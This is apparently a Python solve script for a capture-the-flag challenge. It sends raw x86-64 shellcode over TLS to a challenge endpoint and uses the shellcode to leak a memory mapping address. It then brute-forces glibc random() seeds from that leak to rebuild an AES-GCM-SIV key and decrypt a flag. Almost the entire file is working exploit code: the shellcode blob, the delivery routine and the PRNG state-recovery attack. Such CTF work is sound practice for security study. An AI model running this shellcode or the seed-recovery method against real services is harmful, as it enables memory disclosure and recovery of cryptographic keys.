import base64
import json
import socket
import ssl
import struct
import sys
from pathlib import Path

import numpy as np
from cryptography.hazmat.primitives.ciphers.aead import AESGCMSIV


ROOT = Path(__file__).resolve().parent
SHELLCODE = bytes.fromhex(
    "49bc000000000010000049bd000000000400000049d1edb8090000004c89e74c"
    "89ee31d241ba220010006aff41584531c90f054883f8ef7410b80b0000004c89"
    "e74c89ee0f054d01ec4981fd0010000075c249c7c6009033314531ff4d8926b8"
    "01000000bf010000004c89f6ba080000000f054b8b043c498906b801000000bf"
    "010000004c89f6ba080000000f054983c7084981ff0001000075d8b8e7000000"
    "31ff0f05"
)


def load_endpoint() -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    if endpoint["protocol"] != "tls":
        raise ValueError("main endpoint must use the tls protocol")
    return endpoint


def receive_leak(endpoint: dict) -> tuple[int, bytes]:
    raw = socket.create_connection((endpoint["host"], endpoint["port"]), timeout=10)
    with ssl.create_default_context().wrap_socket(
        raw, server_hostname=endpoint["host"]
    ) as connection:
        connection.settimeout(20)
        connection.sendall(SHELLCODE)
        chunks = []
        while True:
            chunk = connection.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)

    leak = b"".join(chunks)
    if len(leak) != 264:
        raise ValueError(f"expected a 264-byte leak, received {len(leak)} bytes")
    mapping = struct.unpack("<Q", leak[:8])[0]
    encoded = leak[8:].split(b"\0", 1)[0]
    blob = base64.b64decode(encoded, validate=True)
    if len(blob) < 28:
        raise ValueError("encrypted flag blob is too short")
    return mapping, blob


def find_seeds(target_low22: int, batch_size: int = 1 << 20) -> list[int]:
    matches = []
    modulus = np.uint64(2147483647)
    multiplier = np.uint64(16807)

    for start in range(0, 1 << 24, batch_size):
        end = min(start + batch_size, 1 << 24)
        word = np.arange(start, end, dtype=np.uint64)
        word[word == 0] = 1
        state = np.empty((31, end - start), dtype=np.uint32)
        state[0] = word
        for index in range(1, 31):
            word = (multiplier * word) % modulus
            state[index] = word
        for index in range(34, 345):
            np.add(
                state[index % 31],
                state[(index - 3) % 31],
                out=state[index % 31],
            )
        output = state[344 % 31] >> np.uint32(1)
        indices = np.flatnonzero((output & np.uint32(0x3FFFFF)) == target_low22)
        matches.extend(start + int(index) for index in indices)
    return matches


def glibc_outputs(seed: int, count: int) -> list[int]:
    word = seed or 1
    state = [word]
    for _ in range(1, 31):
        word = (16807 * word) % 2147483647
        state.append(word)

    outputs = []
    index = 34
    while len(outputs) < count:
        value = (state[index % 31] + state[(index - 3) % 31]) & 0xFFFFFFFF
        state[index % 31] = value
        if index >= 344:
            outputs.append(value >> 1)
        index += 1
    return outputs


def decrypt_flag(mapping: int, blob: bytes) -> bytes:
    page_index = (mapping >> 12) - 0x100000000
    if not 0 <= page_index < (1 << 22):
        raise ValueError("leaked mapping is outside the randomized range")

    aad, tag, ciphertext = blob[:12], blob[12:28], blob[28:]
    for seed in find_seeds(page_index):
        outputs = glibc_outputs(seed, 33)
        if (outputs[0] & 0x3FFFFF) != page_index:
            continue
        key = bytes(value & 0xFF for value in outputs[1:])
        try:
            plaintext = AESGCMSIV(key).decrypt(bytes(12), ciphertext + tag, aad)
        except Exception:
            continue
        if plaintext.startswith(b"pwnsec{") and plaintext.endswith(b"}"):
            return plaintext
    raise ValueError("no PRNG seed produced an authenticated flag")


def main() -> None:
    mapping, blob = receive_leak(load_endpoint())
    sys.stdout.buffer.write(decrypt_flag(mapping, blob))


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        sys.stderr.write(f"solve failed: {error}\n")
        raise SystemExit(1)
